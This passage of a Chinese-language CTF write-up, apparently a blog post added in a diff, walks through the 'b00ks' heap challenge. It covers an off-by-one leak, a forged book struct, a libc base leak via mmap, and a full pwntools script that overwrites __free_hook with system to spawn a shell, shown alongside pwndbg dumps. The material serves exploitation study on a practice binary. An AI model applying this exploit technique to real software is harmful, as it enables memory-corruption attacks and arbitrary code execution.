class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="comment">#0x00005555556036f0该地址用来存放malloc创造的list地址</span></span><br></pre></td></tr></table></figure>
+
+<p>当我进行下面操作：&#x2F;&#x2F;需要调试list1_addr的地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0xe0</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0xe0</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Author: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class="line">list1_addr=u64(p.recvuntil(<span class="string">&#x27;\\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#list1——addr就是555555603600这个值</span></span><br><span class="line">pwndbg&gt; x/20gx <span class="number">0x555555602040</span></span><br><span class="line"><span class="number">0x555555602040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x555555602050</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x555555602060</span>:	<span class="number">0x0000555555603600</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+
+<p>发现0x00005555556036f0最后两位变成了\X00，就是off-by-one，这样程序会认为该地址0x555555603600才是list的地址，我们直接看一下布局：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20xg <span class="number">0x555555602040</span></span><br><span class="line"><span class="number">0x555555602040</span>:	<span class="number">0x0000786b6b687779</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602060</span>:	<span class="number">0x00005555556036f0</span>	<span class="number">0x0000555555603760</span>  <span class="comment">#list_1 &amp; list_2</span></span><br><span class="line"><span class="number">0x555555602070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+
+<p>可以发现0x00005555556036f0存的是list1堆地址起始地址（不包括size）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x5555556036a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x5555556036b0</span>:	<span class="number">0x0000000071717171</span>	<span class="number">0x0000000000000000</span>	<span class="comment">#list_1_bookname</span></span><br><span class="line"><span class="number">0x5555556036c0</span>:	<span class="number">0x0000000000000000</span>	（pre_size）</span><br><span class="line">																		<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x5555556036d0</span>:	<span class="number">0x0000000077777777</span>	<span class="number">0x0000000000000000</span>	<span class="comment">#list_1_description</span></span><br><span class="line"><span class="number">0x5555556036e0</span>: <span class="number">0x0000000000000000</span>  （pre_size）</span><br><span class="line">																		<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5555556036f0</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x00005555556036b0</span>	<span class="comment">#list_1</span></span><br><span class="line"><span class="number">0x555555603700</span>:	<span class="number">0x00005555556036d0</span>	<span class="number">0x0000000000000004</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x555555603710</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x555555603720</span>:	<span class="number">0x0000000065656565</span>	<span class="number">0x0000000000000000</span>  <span class="comment">#list_2_bookname</span></span><br><span class="line"><span class="number">0x555555603730</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x555555603740</span>:	<span class="number">0x0000000072727272</span>	<span class="number">0x0000000000000000</span>	<span class="comment">#list_2_description</span></span><br><span class="line"><span class="number">0x555555603750</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x555555603760</span>:	<span class="number">0x0000000000000002</span>	<span class="number">0x0000555555603720</span>	<span class="comment">#list_2</span></span><br><span class="line"><span class="number">0x555555603770</span>:	<span class="number">0x0000555555603740</span>	<span class="number">0x0000000000000004</span></span><br><span class="line"><span class="number">0x555555603780</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020881</span></span><br></pre></td></tr></table></figure>
+
+<p>那么，我创建list1和list2，并且修改list1的decription时：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0xe0</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0xe0</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">create(<span class="number">0x21000</span>, <span class="string">&#x27;cccc&#x27;</span>, <span class="number">0x21000</span>, <span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">1</span>) + p64(book2_control_ptr + <span class="number">8</span>) * <span class="number">2</span> + p64(<span class="number">0x1000</span>)</span><br><span class="line">change(<span class="number">1</span>,payload)</span><br><span class="line"><span class="number">0x5555556036f0</span>:	<span class="number">0x0000000000000001</span>（<span class="built_in">id</span>）	<span class="number">0x00005555556036b0</span>（bookname_addr）	<span class="comment">#list_1</span></span><br><span class="line"><span class="number">0x555555603700</span>:	<span class="number">0x00005555556036d0</span>（description_addr）	<span class="number">0x0000000000000004</span>（size）</span><br></pre></td></tr></table></figure>
+
+<p>heap空间布局如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x55c18a470400</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x000055c18a4704c8</span>	<span class="comment">#fake_list</span></span><br><span class="line"><span class="number">0x55c18a470410</span>:	<span class="number">0x000055c18a4704c8</span>	<span class="number">0x0000000000001000</span></span><br><span class="line">该处虚假的<span class="built_in">list</span>，p位设为<span class="number">0</span>，程序会把这个地方识别为list1</span><br></pre></td></tr></table></figure>
+
+<p>这个地址就是list2的name地址，获取这个地址是要求libc_base，因为list2开辟空间太大，使用mmap函数开辟</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x563fc9c00000</span>     <span class="number">0x563fc9c02000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      /home/ywhkkx/桌面/b00ks</span><br><span class="line">    <span class="number">0x563fc9e01000</span>     <span class="number">0x563fc9e02000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /home/ywhkkx/桌面/b00ks</span><br><span class="line">    <span class="number">0x563fc9e02000</span>     <span class="number">0x563fc9e03000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /home/ywhkkx/桌面/b00ks</span><br><span class="line">    <span class="number">0x563fcb86d000</span>     <span class="number">0x563fcb88e000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [heap]</span><br><span class="line">    <span class="number">0x7ff6d3dcf000</span>     <span class="number">0x7ff6d3e13000</span> rw-p    <span class="number">44000</span> <span class="number">0</span>      [anon_7ff6d3dcf]</span><br><span class="line">    <span class="number">0x7ff6d3e13000</span>     <span class="number">0x7ff6d3e38000</span> r--p    <span class="number">25000</span> <span class="number">0</span>      /usr/lib/x86_64-linux-gnu/libc-<span class="number">2.31</span>.so</span><br><span class="line">    <span class="number">0x7ff6d3e38000</span>     <span class="number">0x7ff6d3fb0000</span> r-xp   <span class="number">178000</span> <span class="number">25000</span>  /usr/lib/x86_64-linux-gnu/libc-<span class="number">2.31</span>.so</span><br><span class="line">    <span class="number">0x7ff6d3fb0000</span>     <span class="number">0x7ff6d3ffa000</span> r--p    4a000 19d000 /usr/lib/x86_64-linux-gnu/libc-<span class="number">2.31</span>.so</span><br><span class="line">    <span class="number">0x7ff6d3ffa000</span>     <span class="number">0x7ff6d3ffb000</span> ---p     <span class="number">1000</span> <span class="number">1e7000</span> /usr/lib/x86_64-linux-gnu/libc-<span class="number">2.31</span>.so</span><br><span class="line">-------------------------------------------------------------------------</span><br><span class="line">[+] bookname2 &gt;&gt;<span class="number">0x7ff6d3df1010</span></span><br><span class="line">libc = <span class="number">0x7ff6d3e13000</span> - bookname2 </span><br><span class="line">pwndbg&gt; x/60xg <span class="number">0x55c18a470390</span></span><br><span class="line"><span class="number">0x55c18a470390</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000000f1</span></span><br><span class="line"><span class="number">0x55c18a4703a0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span>	<span class="comment">#list_1_description</span></span><br><span class="line"><span class="number">0x55c18a4703b0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55c18a4703c0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55c18a4703d0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55c18a4703e0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55c18a4703f0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span>	</span><br><span class="line"><span class="number">0x55c18a470400</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x000055c18a4704c8</span>	<span class="comment">#fake_list</span></span><br><span class="line"><span class="number">0x55c18a470410</span>:	<span class="number">0x000055c18a4704c8</span>	<span class="number">0x0000000000001000</span></span><br><span class="line"><span class="number">0x55c18a470420</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span>	</span><br><span class="line"><span class="number">0x55c18a470430</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55c18a470440</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55c18a470450</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55c18a470460</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55c18a470470</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55c18a470480</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x55c18a470490</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x000055c18a4702b0</span>	<span class="comment">#list_1</span></span><br><span class="line"><span class="number">0x55c18a4704a0</span>:	<span class="number">0x000055c18a4703a0</span>	<span class="number">0x00000000000000e0</span></span><br><span class="line"><span class="number">0x55c18a4704b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x55c18a4704c0</span>:	<span class="number">0x0000000000000002</span>	<span class="number">0x00007fee78052010</span>	<span class="comment">#list_2</span></span><br><span class="line"><span class="number">0x55c18a4704d0</span>:	<span class="number">0x00007fee78030010</span>	<span class="number">0x0000000000021000</span></span><br><span class="line"><span class="number">0x55c18a4704e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000000000001fb21</span></span><br></pre></td></tr></table></figure>
+
+<p>接下来可以用free_hook来getshell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">libc_base = bookname2 + <span class="number">0x21ff0</span> </span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="comment">#one_gadget = libc_base + 0xe6c81</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">success(<span class="string">&#x27;system &gt;&gt;&#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>, p64(bin_sh) + p64(free_hook))</span><br><span class="line">change(<span class="number">2</span>, p64(system))</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
+
+<p>其实就是求出binsh，freehook，system地址，然后再次放到list1里进行伪造</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x55c18a470400</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x000055c18a4704c8</span>	<span class="comment">#fake_list</span></span><br><span class="line"><span class="number">0x55c18a470410</span>:	<span class="number">0x000055c18a4704c8</span>	<span class="number">0x0000000000001000</span>  <span class="comment">#fake_description(list_2)</span></span><br><span class="line"><span class="number">0x55c18a470420</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55c18a4704c0</span>:	<span class="number">0x0000000000000002</span>	addr(<span class="string">&quot;/bin/sh&quot;</span>)		<span class="comment">#list_2</span></span><br><span class="line"><span class="number">0x55c18a4704d0</span>:	addr(free_hook)		<span class="number">0x0000000000021000</span></span><br><span class="line"><span class="number">0x55c18a4704e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000000000001fb21</span></span><br></pre></td></tr></table></figure>
+
+<p>执行free（2），就会和上面的合并，也就是执行freehook挂钩的system函数（不是很理解）</p>
+<p>下面是真正的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./b00ks&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./b00ks&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">len_book,bookname,len_description,description</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Enter book name size: &#x27;</span>,<span class="built_in">str</span>(len_book))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;(Max 32 chars): &#x27;</span>,bookname)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;description size: &#x27;</span>,<span class="built_in">str</span>(len_description))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;description: &#x27;</span>,description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;delete: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">index,description</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;want to edit: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;book description: &#x27;</span>,description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">name</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;: &#x27;</span>, name)	</span><br><span class="line">	</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#在 0x555555602040处写入32个a，会覆盖第33位，但并没有创建结构体，所以并没有用到off-by-one</span></span><br><span class="line">create(<span class="number">0xe0</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0xe0</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line"><span class="comment">#创建结构体，在aaaaa下面的地址，地址是：0x0000557c2a0e9490</span></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Author: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class="line">list1_addr=u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#list1_addr是0x0000557c2a0e9490</span></span><br><span class="line">list2_addr=list1_addr+<span class="number">0x30</span></span><br><span class="line"><span class="comment">#list2_addr指向了list1结构体后的一个结构体，如果再创建一个结构体，它就会指向下一个结构体头，地址是：0x557c2a0e94c0</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;list1_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(list1_addr))</span><br><span class="line">success(<span class="string">&quot;list2_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(list2_addr))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x21000</span>, <span class="string">&#x27;cccc&#x27;</span>, <span class="number">0x21000</span>, <span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line"><span class="comment">#创建list2，这个list2在list1结构体后，其中name和description指向的堆地址是0x00007f7b27812010，与0x557xxx不一样，是因为开辟空间太大，采用了mmap开辟</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">1</span>) + p64(list2_addr + <span class="number">8</span>) * <span class="number">2</span> + p64(<span class="number">0x1000</span>)</span><br><span class="line">change(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">change_name(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">bookname2 = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;bookname2 &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(bookname2))</span><br><span class="line"><span class="comment">#继续使用off-by-one泄露bookname2（list2）的地址，libc_base（已知） - bookname2就是偏移</span></span><br><span class="line">libc_base = bookname2 + <span class="number">0x21ff0</span> </span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0xe6c81</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">success(<span class="string">&#x27;system &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#通过对构造的fake_list进行写，那为什么不直接change(2)进行写呢，因为写这个操作是对结构体中的地址里的内容进行写，而不是直接覆盖结构体中的地址，（此时list1已经被fake代替，而list2还是list2）</span></span><br><span class="line">change(<span class="number">1</span>, p64(bin_sh) + p64(free_hook))</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#对list2中的description也就是freehook的地址内的东西进行改写，而不是直接覆盖freehook在list2结构的地址</span></span><br><span class="line">change(<span class="number">2</span>, p64(system))</span><br><span class="line"><span class="comment">#free（2）会完成system(’bin_sh‘)操作</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>那这个题的利用思路就很明确了，当输入author时，会触发off-by-one，就是会多写一个字节，然后创建结构体，这个结构体的地址会覆盖掉那个字节，所以我们可以泄露出list1结构体的地址。接下来，我们构建fake_list，fake_list通过覆盖list1的description来写入，当构造完毕，真正的list1已经被fake_list替换，接下来再创建一个结构体2，这个结构体是为了泄露libc_base地址，当拿到system，binsh，freehook地址时，通过对fakelist的description改写（进入0x0000558149b824c8，改写他的值为binsh，freehook值 ），接下来（进入0x00007fb9c96ce010 ，改写他的值为system），free（2）就可以完成攻击shell操作。</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>x<span class="number">558149b82400</span>: <span class="number">0</span>x00000<span class="number">00000000001</span>      <span class="number">0</span>x0000558<span class="number">149b824c8</span> fakelist</span><br><span class="line"><span class="number">0</span>x<span class="number">558149b82410</span>: <span class="number">0</span>x0000558<span class="number">149b824c8</span>      <span class="number">0</span>x00000<span class="number">00000001000</span></span><br><span class="line"><span class="number">0</span>x<span class="number">558149b82420</span>: <span class="number">0</span>x00000<span class="number">00000000000</span>      <span class="number">0</span>x00000<span class="number">00000000000</span></span><br><span class="line"><span class="number">0</span>x<span class="number">558149b82430</span>: <span class="number">0</span>x00000<span class="number">00000000000</span>      <span class="number">0</span>x00000<span class="number">00000000000</span></span><br><span class="line"><span class="number">0</span>x<span class="number">558149b82440</span>: <span class="number">0</span>x00000<span class="number">00000000000</span>      <span class="number">0</span>x00000<span class="number">00000000000</span></span><br><span class="line"><span class="number">0</span>x<span class="number">558149b82450</span>: <span class="number">0</span>x00000<span class="number">00000000000</span>      <span class="number">0</span>x00000<span class="number">00000000000</span></span><br><span class="line"><span class="number">0</span>x<span class="number">558149b82460</span>: <span class="number">0</span>x00000<span class="number">00000000000</span>      <span class="number">0</span>x00000<span class="number">00000000000</span></span><br><span class="line"><span class="number">0</span>x<span class="number">558149b82470</span>: <span class="number">0</span>x00000<span class="number">00000000000</span>      <span class="number">0</span>x00000<span class="number">00000000000</span></span><br><span class="line"><span class="number">0</span>x<span class="number">558149b82480</span>: <span class="number">0</span>x00000<span class="number">00000000000</span>      <span class="number">0</span>x00000<span class="number">00000000031</span></span><br><span class="line"><span class="number">0</span>x<span class="number">558149b82490</span>: <span class="number">0</span>x00000<span class="number">00000000001</span>      <span class="number">0</span>x0000558149b822b0list1</span><br><span class="line"><span class="number">0</span>x558<span class="number">149b824a0</span>: <span class="number">0</span>x0000558<span class="number">149b823a0</span>      <span class="number">0</span>x000000<span class="number">00000000e0</span></span><br><span class="line"><span class="number">0</span>x558<span class="number">149b824b0</span>: <span class="number">0</span>x00000<span class="number">00000000000</span>      <span class="number">0</span>x00000<span class="number">00000000031</span></span><br><span class="line"><span class="number">0</span>x558<span class="number">149b824c0</span>: <span class="number">0</span>x00000<span class="number">00000000002</span>      <span class="number">0</span>x00007fb9c96f0010list2</span><br><span class="line"><span class="number">0</span>x558<span class="number">149b824d0</span>: <span class="number">0</span>x00007fb9c96ce010      <span class="number">0</span>x00000<span class="number">00000021000</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="chunk-extend-and-overlapping"><a href="#chunk-extend-and-overlapping" class="headerlink" title="chunk extend and overlapping"></a>chunk extend and overlapping</h2><p>chunk extend是对漏洞的常见利用手法，通过extend可以实现chunk overlapping效果，需要程序中存在堆的漏洞并且漏洞可以控制chunk header中的数据</p>
+<p>原理：chunk extend能产生的原因在于ptmalloc在对堆chunk进行操作时使用的各种宏：</p>
